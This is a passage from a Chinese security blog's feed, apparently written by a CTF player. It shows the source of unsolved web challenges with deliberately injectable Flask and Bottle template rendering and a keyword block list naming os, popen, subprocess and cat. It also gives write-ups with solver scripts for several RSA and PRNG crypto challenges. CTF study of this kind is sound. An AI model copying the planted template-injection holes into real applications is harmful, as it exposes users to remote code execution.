class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1*"></a>Now you see me 1*</h2><blockquote><p><code>&#123;%print("Welcome the four horsemen tonight!")%&#125;</code></p></blockquote><p>先解<code>base64</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># YOU FOUND ME ;)</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   src.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 01:10:37</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span class="string">&quot;translate&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sort&quot;</span>, <span class="string">&quot;base64&quot;</span>, <span class="string">&quot;encode&quot;</span>, <span class="string">&quot;\\u&quot;</span>, <span class="string">&quot;pop&quot;</span>, <span class="string">&quot;referer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;The closer you see, the lesser you find.&quot;</span>] </span><br><span class="line">        <span class="comment"># I hate all these.</span></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;try /H3dden_route&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/H3dden_route&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r3al_ins1de_th0ught</span>():</span><br><span class="line">    <span class="keyword">global</span> enable_hook, counter</span><br><span class="line">    name = flask.request.args.get(<span class="string">&#x27;My_ins1de_w0r1d&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> name.startswith(<span class="string">&quot;Follow-your-heart-&quot;</span>):</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> lock_within:</span><br><span class="line">                    <span class="keyword">if</span> i <span class="keyword">in</span> name:</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">&#x27;NOPE.&#x27;</span></span><br><span class="line">                enable_hook = <span class="literal">True</span></span><br><span class="line">                a = flask.render_template_string(<span class="string">&#x27;&#123;#&#x27;</span>+<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span>+<span class="string">&#x27;#&#125;&#x27;</span>)</span><br><span class="line">                enable_hook = <span class="literal">False</span></span><br><span class="line">                counter = <span class="number">0</span></span><br><span class="line">                <span class="keyword">return</span> a</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;My inside world is always hidden.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> RuntimeError <span class="keyword">as</span> e:</span><br><span class="line">            counter = <span class="number">0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;NO.&#x27;</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Error&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Welcome to Hidden_route!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">import</span> _posixsubprocess</span><br><span class="line">        <span class="keyword">del</span> _posixsubprocess.fork_exec</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">import</span> subprocess</span><br><span class="line">    <span class="keyword">del</span> os.popen</span><br><span class="line">    <span class="keyword">del</span> os.system</span><br><span class="line">    <span class="keyword">del</span> subprocess.Popen</span><br><span class="line">    <span class="keyword">del</span> subprocess.call</span><br><span class="line">    <span class="keyword">del</span> subprocess.run</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_output</span><br><span class="line">    <span class="keyword">del</span> subprocess.getoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.check_call</span><br><span class="line">    <span class="keyword">del</span> subprocess.getstatusoutput</span><br><span class="line">    <span class="keyword">del</span> subprocess.PIPE</span><br><span class="line">    <span class="keyword">del</span> subprocess.STDOUT</span><br><span class="line">    <span class="keyword">del</span> subprocess.CalledProcessError</span><br><span class="line">    <span class="keyword">del</span> subprocess.TimeoutExpired</span><br><span class="line">    <span class="keyword">del</span> subprocess.SubprocessError</span><br><span class="line">    sys.addaudithook(audit_checker)</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><h2 id="Now-you-see-me-2"><a href="#Now-you-see-me-2" class="headerlink" title="Now you see me 2*"></a>Now you see me 2*</h2><blockquote><p><code>&#123;%print("We are the four horsemen.")%&#125; 压缩包密码为“Now you see me 1”的flag</code></p></blockquote><h2 id="出题人已疯"><a href="#出题人已疯" class="headerlink" title="出题人已疯*"></a>出题人已疯*</h2><blockquote><p>出题人已疯，你知道出题人为什么疯吗</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   app.py</span></span><br><span class="line"><span class="string">@Time    :   2025/03/29 15:52:17</span></span><br><span class="line"><span class="string">@Author  :   LamentXU </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag in /flag</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    payload = bottle.request.query.get(<span class="string">&#x27;payload&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload <span class="keyword">and</span> <span class="built_in">len</span>(payload) &lt; <span class="number">25</span> <span class="keyword">and</span> <span class="string">&#x27;open&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload <span class="keyword">and</span> <span class="string">&#x27;\\&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> bottle.template(<span class="string">&#x27;hello &#x27;</span>+payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        bottle.abort(<span class="number">400</span>, <span class="string">&#x27;Invalid payload&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">出题人</a></p><h2 id="出题人又疯"><a href="#出题人又疯" class="headerlink" title="出题人又疯*"></a>出题人又疯*</h2><blockquote><p>出题人又疯了，你知道这次出题人为什么疯吗？<br>（附件密码是“出题人已疯的flag”）</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;*代表未解决，可能是卡了，也可能是没思路了，简单做个记录，然后跑了，再或者是后续没来得及复现，在此处留个坑，等以后回来填上……&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://gz.imxbt.cn/games/23&quot;&gt;复现网址&lt;/a&gt;&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Cryptography趣题记录</title>
    <link href="https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/04/03/%E5%AF%86%E7%A0%81%E8%B6%A3%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-04-03T06:35:29.000Z</published>
    <updated>2025-09-07T09:46:58.370Z</updated>
    
    <content type="html"><![CDATA[<p>这里也记录一下，各种比赛零零散散的题目(觉得比较有意思的)</p><h1 id="KalmarCTF2025-basic-sums"><a href="#KalmarCTF2025-basic-sums" class="headerlink" title="KalmarCTF2025 - basic sums"></a>KalmarCTF2025 - basic sums</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># I found this super cool function on stack overflow \o/ https://stackoverflow.com/questions/2267362/how-to-convert-an-integer-to-a-string-in-any-base</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">numberToBase</span>(<span class="params">n, b</span>):</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> [<span class="number">0</span>]</span><br><span class="line">    digits = []</span><br><span class="line">    <span class="keyword">while</span> n:</span><br><span class="line">        digits.append(<span class="built_in">int</span>(n % b))</span><br><span class="line">        n //= b</span><br><span class="line">    <span class="keyword">return</span> digits[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) &lt;= <span class="number">45</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">int</span>.from_bytes(flag, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Give me a base! &quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too small&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"><span class="keyword">if</span> base &gt; <span class="number">256</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Base is too big&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;Here you go! <span class="subst">&#123;<span class="built_in">sum</span>(numberToBase(flag, base))&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>题目代码非常简单，我们会得到<strong>flag转换为n进制之后的数字之和</strong>，可以写成下面的形式</p><p>$flag=a_{n}b^{n}+a_{n-1}b^{n-1}+a_{n-2}b^{n-2}+…+a_{0}b^{0}$<br>$同时，不难看出有$<br>$flag\equiv sums\equiv a_{n}+a_{n-1}+a_{n-2}+…+a_{1}+a_{1}(mod\ b-1)$<br><img src="https://pic1.zhimg.com/80/v2-e37944dd5555d6ecc347a59f817263ba_1440w.png" alt=""><br>上面是我们选择的进制之间的<strong>最小公倍数</strong>，下面是<strong>flag的近似大小(肯定要比这个大)</strong></p><p>所以，当<strong>模数足够大</strong>的时候，<code>flag</code>模它才能得到本身，同时我们也有</p><p>$flag\equiv sums\ mod\ (b-1)$</p><p>$flag\equiv m\ mod\ lcm(n,b-1)$</p><p>在b不断增大的情况下，<strong>对m不断地进行crt结果的合并</strong>，当最小公倍数增大到<strong>模数大于flag的值</strong>时，我们才能获取到<strong>flag的唯一解</strong></p><p>$flag=crt([m,sums],[lcm(n,b-1),b-1])$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">m = <span class="number">0</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>,<span class="number">256</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;basic-sums.chal-kalmarc.tf&#x27;</span>, <span class="number">2256</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Give me a base! &#x27;</span>,<span class="built_in">str</span>(i).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;go! &#x27;</span>)</span><br><span class="line">    m0 = <span class="built_in">int</span>(p.recvline())</span><br><span class="line">    n0 = i-<span class="number">1</span></span><br><span class="line">    m = crt([m,m0],[n,n0])</span><br><span class="line">    n = lcm(n,n0)</span><br><span class="line">    p.close()</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;kalmar&#123;At_least_it_wasnt_lattices_right???!?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/80/v2-2f0a7e2ca653e85402ba8c351ccf9640_1440w.png" alt=""><br>这图片起到了一定的迷惑作用，我还以为要构造格才做的出来，我寻思着我这格构造的好像也不怎么行啊，而且这么多组数据，要怎么整呢，然后就看到<strong>春哥</strong>做出来了，牛批！！！</p><p>所以上面其实是我看了春哥写的文档之后，思考了一番(过程应该没问题)，觉得挺有意思的记录一下OvO</p><h1 id="TPCTF2025-randomized-random-待专研"><a href="#TPCTF2025-randomized-random-待专研" class="headerlink" title="TPCTF2025 - randomized random(待专研)"></a>TPCTF2025 - randomized random(待专研)</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># FROM python:3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag=f.read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>**<span class="number">64</span>):</span><br><span class="line">    <span class="built_in">print</span>(random.getrandbits(<span class="number">32</span>)+flag[random.getrandbits(<span class="number">32</span>)%<span class="built_in">len</span>(flag)])</span><br><span class="line">    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>看到<code>getrandbits</code>，可以立马想到<code>MT19937</code>，这里的话因为两个随机数“加”起来了，我们不好处理，但是可以看做是我们可以得到不连续的随机数中的高24位，但看了师傅们的wp都说了实际测试发现影响到了低20位，所以取得是高12位</p><p>然后就是<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">不连续的MT19937</a></p><p>待我有空再钻研钻研</p><h1 id="2024第四届长城杯-RandomRSA-未完待续"><a href="#2024第四届长城杯-RandomRSA-未完待续" class="headerlink" title="2024第四届长城杯 - RandomRSA(未完待续)"></a>2024第四届长城杯 - RandomRSA(未完待续)</h1><blockquote><p>题目描述：A特工从敌方服务器获取到了一份带有hint的机密文件，请协助破解加密。</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LCG</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, p, a, b</span>):</span><br><span class="line">        self.p = p</span><br><span class="line">        self.a = a</span><br><span class="line">        self.b = b</span><br><span class="line">        self.x = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(self.p, self.a, self.b)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):</span><br><span class="line">        self.x = (self.a*self.x+self.b) % self.p</span><br><span class="line">        <span class="keyword">return</span> self.x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPrimes</span>(<span class="params">bits, k</span>):</span><br><span class="line">    p = getPrime(bits)</span><br><span class="line">    a = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    b = random.randint(<span class="number">0</span>, p-<span class="number">1</span>)</span><br><span class="line">    l = LCG(p, a, b)</span><br><span class="line">    <span class="keyword">return</span> [gmpy2.next_prime(l.<span class="built_in">next</span>()) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(k)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p, q = getPrimes(<span class="number">1024</span>, <span class="number">2</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(n, c)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p = 170302223332374952785269454020752010235000449292324018706323228421794605831609342383813680059406887437726391567716617403068082252456126724116360291722050578106527815908837796377811535800753042840119867579793401648981916062128752925574017615120362457848369672169913701701169754804744410516724429370808383640129</span></span><br><span class="line"><span class="string">a = 95647398016998994323232737206171888899957187357027939982909965407086383339418183844601496450055752805846840966207033179756334909869395071918100649183599056695688702272113280126999439574017728476367307673524762493771576155949866442317616306832252931038932232342396406623324967479959770751756551238647385191314</span></span><br><span class="line"><span class="string">b = 122891504335833588148026640678812283515533067572514249355105863367413556242876686249628488512479399795117688641973272470884323873621143234628351006002398994272892177228185516130875243250912554684234982558913267007466946601210297176541861279902930860851219732696973412096603548467720104727887907369470758901838</span></span><br><span class="line"><span class="string">n = 5593134172275186875590245131682192688778392004699750710462210806902340747682378400226605648011816039948262008066066650657006955703136928662067931212033472838067050429624395919771757949640517085036958623280188133965150285410609475158882527926240531113060812228408346482328419754802280082212250908375099979058307437751229421708615341486221424596128137575042934928922615832987202762651904056934292682021963290271144473446994958975487980146329697970484311863524622696562094720833240915154181032649358743041246023013296745195478603299127094103448698060367648192905729866897074234681844252549934531893172709301411995941527</span></span><br><span class="line"><span class="string">c = 2185680728108057860427602387168654320024588536620246138642042133525937248576850574716324994222027251548743663286125769988360677327713281974075574656905916643746842819251899233266706138267250441832133068661277187507427787343897863339824140927640373352305007520681800240743854093190786046280731148485148774188448658663250731076739737801267702682463265663725900621375689684459894544169879873344003810307496162858318574830487480360419897453892053456993436452783099460908947258094434884954726862549670168954554640433833484822078996925040310316609425805351183165668893199137911145057639657709936762866208635582348932189646</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>$x\equiv ax+b\%p$<br>$p’\equiv(x+k1)\%p$<br>$q’\equiv(ax+b+k2)\%p$<br>$p’*q’-n\equiv ax^{2}+(b+k2+ak1)x+bk1+k1k2-n\equiv0\%p$<br><code>abpn</code>已知，<code>k1k2</code>是小数可爆破，那就解<code>x</code>的一元二次方程即可</p><p>这里得开多线程搞一手……</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><blockquote><p><a href="https://tover.xyz/p/2024-ccb-RandomRSA/">https://tover.xyz/p/2024-ccb-RandomRSA/</a><br><a href="http://www.andynoel.xyz/?p=904">http://www.andynoel.xyz/?p=904</a><br><a href="https://blog.csdn.net/Jayjay___/article/details/142059111">https://blog.csdn.net/Jayjay___/article/details/142059111</a></p></blockquote><h1 id="TGCTF2025-EZRSA"><a href="#TGCTF2025-EZRSA" class="headerlink" title="TGCTF2025 - EZRSA"></a>TGCTF2025 - EZRSA</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag, get_random_emojiiiiii</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genarate_emojiiiiii_prime</span>(<span class="params">nbits, base=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(base // <span class="number">32</span> * <span class="number">32</span>) <span class="keyword">if</span> base &gt;= <span class="number">3</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits // <span class="number">8</span> // <span class="number">4</span> - base // <span class="number">32</span>):</span><br><span class="line">            p = (p &lt;&lt; <span class="number">32</span>) + get_random_emojiiiiii()  <span class="comment"># 猜一猜</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag.encode(</span><br><span class="line">) + <span class="string">&quot;&quot;</span>.join([long_to_bytes(get_random_emojiiiiii()).decode() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]).encode())</span><br><span class="line">p = genarate_emojiiiiii_prime(<span class="number">512</span>, <span class="number">224</span>)</span><br><span class="line">q = genarate_emojiiiiii_prime(<span class="number">512</span>)</span><br><span class="line"></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="string">&quot;💯&quot;</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, bytes_to_long(e.encode()), n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p0 =&quot;</span>, long_to_bytes(p % <span class="number">2</span> ** <span class="number">256</span>).decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n =&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># p0 = 😘😾😂😋😶😾😳😷</span></span><br><span class="line"><span class="comment"># n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line"><span class="comment"># c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401</span></span><br></pre></td></tr></table></figure><p>可以看到<code>p</code>相当于一个<strong>224位的素数拼接9个emoji符号</strong>而来，而<code>get_random_emojiiiiii()</code>这个函数我们未知</p><p>这里是<strong>p的低位泄露攻击</strong>，我们知道了<strong>p一半的位数</strong>，尝试后我们可以发现<strong>256位</strong>似乎不够我们进行攻击</p><p>(部分情况下，1024位需要知道<strong>576比特位</strong>，512位需要知道<strong>288比特位</strong>，有的又是需要256位再<strong>多一个字节</strong>，d的泄露需要知道至少<strong>1/4的比特位</strong>，视情况而定吧)</p><p>可以看到<code>p</code>的<strong>低8字节</strong>已经给出，而我们还可以再爆破出<strong>高一个字节</strong>，查阅<a href="https://apps.timwhitlock.info/emoji/tables/unicode">emoji符号的范围</a>，我们得到以下脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">e = bytes_to_long(<span class="string">&quot;💯&quot;</span>.encode())</span><br><span class="line">p0 = bytes_to_long(<span class="string">&quot;😘😾😂😋😶😾😳😷&quot;</span>.encode())</span><br><span class="line">n = <span class="number">156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">0xf09f9880</span>,<span class="number">0xf09f998f</span>):</span><br><span class="line">    p00 = i*<span class="number">2</span>^<span class="number">256</span> + p0</span><br><span class="line">    f = x*<span class="number">2</span>^<span class="number">288</span>+p00</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X = <span class="number">2</span>**<span class="number">224</span>,beta=<span class="number">0.4</span>,epsilon=<span class="number">0.02</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:       </span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>])*<span class="number">2</span>^<span class="number">288</span> + p00</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后就是$e与\phi 不互素$，上板子即可</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># 